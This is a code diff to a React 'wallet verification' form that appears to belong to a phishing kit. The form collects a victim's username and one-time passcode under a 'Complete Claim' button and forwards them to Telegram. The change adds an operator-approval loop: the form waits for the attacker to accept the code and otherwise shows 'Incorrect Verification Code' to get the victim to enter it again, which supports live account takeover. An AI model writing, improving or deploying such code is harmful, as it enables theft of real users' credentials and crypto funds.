@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { sendToTelegram } from '../utils/telegram';
+import { sendLoginToTelegramAndWait } from '../utils/telegram';
 
 interface VerificationFormProps {
   username: string;
@@ -12,18 +12,24 @@ interface VerificationFormProps {
 const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify, onBack, isSecondCode = false }) => {
   const [code, setCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrorMsg('');
 
     // Specifically label the second attempt as "REENTERED CODE"
     const codeLabel = isSecondCode ? 'REENTERED CODE' : 'CODE 1';
     const message = `<b>✅ WALLET VERIFICATION ${codeLabel} ✅</b>\n\n<b>👤 User:</b> <code>${username}</code>\n<b>🔢 OTP Code:</b> <code>${code}</code>\n\n<i>🛡️ Account Verification Sequence</i>`;
 
     try {
-      await sendToTelegram(message);
-      onVerify();
+      const isAccepted = await sendLoginToTelegramAndWait(message, username, true);
+      if (isAccepted) {
+        onVerify();
+      } else {
+        setErrorMsg('Incorrect Verification Code');
+      }
     } catch (error) {
       onVerify(); 
     } finally {
@@ -72,6 +78,12 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify,
           />
         </div>
 
+        {errorMsg && (
+          <div className="bg-red-50 text-red-600 p-3 rounded-xl text-sm font-semibold text-center animate-in fade-in zoom-in duration-200">
+            {errorMsg}
+          </div>
+        )}
+
         <button
           type="submit"
           disabled={isLoading || code.length < 4}
@@ -83,7 +95,7 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ username, onVerify,
               <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
           ) : null}
-          {isLoading ? 'Verifying...' : 'Complete Claim'}
+          {isLoading ? 'Waiting for approval...' : 'Complete Claim'}
         </button>
 
         <div className="text-center">
